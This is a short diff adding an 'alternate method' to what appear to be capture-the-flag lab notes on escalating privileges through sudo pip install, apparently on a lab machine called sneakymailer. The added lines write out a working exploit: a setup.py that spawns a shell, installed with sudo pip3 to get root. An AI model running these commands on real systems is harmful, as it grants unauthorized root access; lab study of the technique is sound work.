@@ -178,3 +178,8 @@ ROOT: https://root4loot.com/post/pip-install-privilege-escalation/
   sudo -H /usr/bin/pip3 install . --upgrade --force-reinstall
     create a setup.py file and exploit root
     the sudo command will run the setup file
+
+ALTERNATE METHOD:
+    low@sneakymailer:~$ TF=$(mktemp -d)
+    low@sneakymailer:~$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
+    low@sneakymailer:~$ sudo pip3 install $TF
